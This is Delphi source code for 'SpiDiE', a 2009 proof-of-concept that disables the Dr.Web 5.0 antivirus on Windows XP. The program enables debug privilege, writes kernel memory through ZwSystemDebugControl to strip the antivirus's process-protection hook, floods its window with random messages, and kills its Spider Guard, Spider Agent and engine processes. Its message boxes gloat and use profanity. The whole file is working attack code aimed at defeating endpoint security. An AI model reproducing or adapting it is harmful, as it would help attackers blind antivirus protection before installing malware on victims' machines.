{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows, WinNative, WinBase, Messages, Loader, RTL, FMM;

implementation

var
  bFound1: boolean = false;
  bFound2: boolean = false;
  bFound3: boolean = false;

const
  DrWebProcesses: array[0..2] of PWideChar = ('dwengine.exe', 'spiderml.exe', 'spidernt.exe');
  DrWeb5Title: PWideChar = 'Dr.Web';
  SpiderGuard: PWideChar = 'Spider Guard';
  SpiderAgent: PWideChar = 'SpiderAgent Main';
  SpiDiE10: PWideChar = 'SpiDiE 1.2';
  Str2: PAnsiChar = 'Привет SWW :) Не важно, где ты теперь работаешь, главное - талант, а он у тебя есть :)';
  DrWeb5TitleLen: integer = 6;
  SpiderGuardLen: integer = 12;
  SpiderAgentLen: integer = 16;

{$R version.res}

var
  bytesIO: DWORD;
  PsProcessType: OBJECT_TYPE;
  KernelBase: dword; // адрес ядра в памяти
  KernelSize: DWORD;
  pntkernel: pointer;

type
  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

procedure GetOriginalSystemState();
var
  modinf: SYSINFO_BUFFER;
  bytesIO: ULONG;
  textbuf: array[0..MAX_PATH - 1] of WideChar;
begin
  bytesIO := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @modinf, sizeof(SYSINFO_BUFFER), @bytesIO);
  if (bytesIO = 0) then exit;
  strcpyW(textbuf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(textbuf, '\system32\');
  RtlAnsiToUnicode(strendW(textbuf), @modinf.ModInfo[0].ImageName[modinf.ModInfo[0].ModuleNameOffset]);
  KernelBase := Cardinal(modinf.ModInfo[0].Base);
  pntkernel := PELdrLoadLibrary(textbuf, nil, modinf.ModInfo[0].Base);
  if (pntkernel <> nil) then
  begin
    KernelSize := PEGetVirtualSize(pntkernel);
  end;
end;

function RemoveDwProtHooks(): boolean;
var
  p1: PVOID;
  bytesIO: ULONG;
  Status: NTSTATUS;
  rv: MEMORY_CHUNKS;
begin
  result := false;
  GetOriginalSystemState();

  memzero(@PsProcessType, sizeof(OBJECT_TYPE));
  p1 := PChar(FastGetProcAddress(HINST(pntkernel), 'PsProcessType')) - DWORD(pntkernel) + DWORD(KernelBase);
  rv.Address := p1;
  rv.Data := @p1;
  rv.Length := sizeof(DWORD);
  Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
  if (Status = STATUS_SUCCESS) then
  begin
    rv.Address := p1;
    rv.Data := @PsProcessType;
    rv.Length := sizeof(OBJECT_TYPE);
    Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
    if (Status = STATUS_SUCCESS) then
    begin
      bytesIO := 0;
      rv.Address := pointer(DWORD(p1) + $90); //OpenProcedure removal
      rv.Data := @bytesIO;
      rv.Length := sizeof(DWORD);
      SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
      Status := ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
      SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
      result := (Status = STATUS_SUCCESS);
    end;
  end;
end;

function drweb5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound1 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, DrWeb5Title, DrWeb5TitleLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound1 := true;
    end;
  end;
  result := true;
end;

function spider5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound2 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, SpiderGuard, SpiderGuardLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound2 := true;
    end;
  end;
  result := true;
end;

function spideragent5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound3 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, SpiderAgent, SpiderAgentLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound3 := true;
    end;
  end;
  result := true;
end;

function GetDrWebMainWindow(): HWND;
begin
  bFound1 := false;
  result := 0;
  EnumWindows(@drweb5, Integer(@result));
end;

function GetSpiderAgentWindow(): HWND;
begin
  bFound2 := false;
  result := 0;
  EnumWindows(@spideragent5, Integer(@result));
end;

function GetSpiderGuardWindow(): HWND;
begin
  bFound2 := false;
  result := 0;
  EnumWindows(@spider5, Integer(@result));
end;

procedure RandomizeEx;
var
  systemTime:
  record
    wYear: Word;
    wMonth: Word;
    wDayOfWeek: Word;
    wDay: Word;
    wHour: Word;
    wMinute: Word;
    wSecond: Word;
    wMilliSeconds: Word;
    reserved: array[0..7] of char;
  end;
asm
        LEA     EAX,systemTime
        PUSH    EAX
        CALL    GetSystemTime
        MOVZX   EAX,systemTime.wHour
        IMUL    EAX,60
        ADD     AX,systemTime.wMinute   { sum = hours * 60 + minutes    }
        IMUL    EAX,60
        XOR     EDX,EDX
        MOV     DX,systemTime.wSecond
        ADD     EAX,EDX                 { sum = sum * 60 + seconds              }
        IMUL    EAX,1000
        MOV     DX,systemTime.wMilliSeconds
        ADD     EAX,EDX                 { sum = sum * 1000 + milliseconds       }
        MOV     RandSeed,EAX
end;

procedure ShowMessage(PStr: PAnsiChar; Buttons: DWORD);
var
  buf: LBuf;
begin
  memzero(@buf, sizeof(buf));
  RTL.RtlAnsiToUnicode(buf, PStr);
  MessageBoxW(GetDesktopWindow, buf, SpiDiE10, Buttons);
end;

function KillProcess(ProcessId: Cardinal; ExitCode: DWORD = $BADC0DE): boolean; stdcall;
var
  f: THANDLE;
begin
  result := false;
  f := OpenProcess(PROCESS_TERMINATE, false, ProcessId);
  if (f <> 0) then
  begin
    result := TerminateProcess(f, ExitCode);
    CloseHandle(f);
  end;
end;

procedure FindAndKillDwEngine();
var
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;
  i: integer;
  buf: LBuf;
begin
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat
        for i := 0 to 2 do
        begin
          if (strcmpiW(pbuffer.szExeFile, DrWebProcesses[i]) = 0) then
          begin
            strcpyW(buf, 'DrWeb additional process ***');
            strcatW(buf, @pbuffer.szExeFile);
            strcatW(buf, '*** found in system, killing in a progress...');
            MessageBoxW(GetDesktopWindow(), buf, '', MB_ICONINFORMATION);
            if (KillProcess(pbuffer.th32ProcessId, 0)) then
            begin
              strcpyW(buf, 'Process ***');
              strcatW(buf, @pbuffer.szExeFile);
              strcatW(buf, '*** killed }:)');
              MessageBoxW(GetDesktopWindow(), buf, '', MB_ICONINFORMATION);
            end else ShowMessage('Damn! I''m killing processes like old man fucks! ><', MB_ICONERROR);
          end;
        end;
      until (not Process32NextW(SnapShotHandle, @pBuffer));
  CloseHandle(SnapShotHandle);
end;

procedure main();
var
  DrWebHwnd: HWND;
  SpiderHwnd: HWND;
  u, k, i: integer;
begin
  if (MessageBoxW(GetDesktopWindow(), 'User mode proof-of-concept DrWeb 5.0 kill'#13#10 +
    'DKOH and fucking Shadow SSDT will not help DrWeb!'#13#13#10 +
    'Yes to continue, No to exit program'#13#10 +
    '(c) 2009 by EP_X0FF', SpiDiE10, MB_YESNO) = IDNO) then exit;
  RandomizeEx();
  DrWebHwnd := GetDrWebMainWindow();
  if (DrWebHwnd <> 0) then
  begin
    ShowMessage('DrWeb GUI application located :) Let''s do some fuck with it ^_^', MB_ICONINFORMATION);
    for i := $FF to $FFFFF do
    begin
      u := random($FFFF);
      k := random(u) + random($FFF);
      PostMessageW(DrWebHwnd, i, u, k);
    end;
    NtSleep(1000);
    ShowMessage('Muhahaha, see u in HELL', MB_ICONWARNING);
  end else
    if MessageBoxW(GetDesktopWindow(), 'DrWeb app not found, continue?', SpiDiE10, MB_YESNO) = IDNO then exit;

  if (RemoveDwProtHooks()) then
  begin
    SpiderHwnd := GetSpiderGuardWindow();
    if (SpiderHwnd <> 0) then
    begin
      ShowMessage('Spider Guard located :) Let''s remove it.', MB_ICONINFORMATION);
      u := 0;
      GetWindowThreadProcessId(SpiderHwnd, @u);
      if (KillProcess(u)) then ShowMessage('Guardian removed...', MB_ICONINFORMATION);
    end else ShowMessage('Ohh shit!', MB_OK);

    SpiderHwnd := GetSpiderAgentWindow();
    if (SpiderHwnd <> 0) then
    begin
      ShowMessage('Spider Agent also found, proceeding killing...', MB_ICONINFORMATION);
      u := 0;
      GetWindowThreadProcessId(SpiderHwnd, @u);
      if (KillProcess(u)) then ShowMessage('Spider Agent is gone to hell', MB_ICONINFORMATION);
    end;
    FindAndKillDwEngine();
    ShowMessage('That''s all folks!', MB_OK);
  end else ShowMessage('Damn that shit', MB_OK);

  if not bFound1 and not bFound2 and not bFound3 then ShowMessage('Nothing found :('#13#10 + 'Start DrWeb 5 first! =)', MB_OK);
end;

var
  osver: OSVERSIONINFOEXW;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    ShowMessage('Unsupported OS <Всем_похуй>', MB_ICONINFORMATION);
  end else
  begin
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false, @bytesIO);
    ProcessHeapHandle := fmmCreate();
    main();
    fmmDestroy(ProcessHeapHandle);
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @pntkernel, @bytesIO, MEM_RELEASE);
  end;
  ExitProcess(0);
  asm
    call Str2
  end;
end.

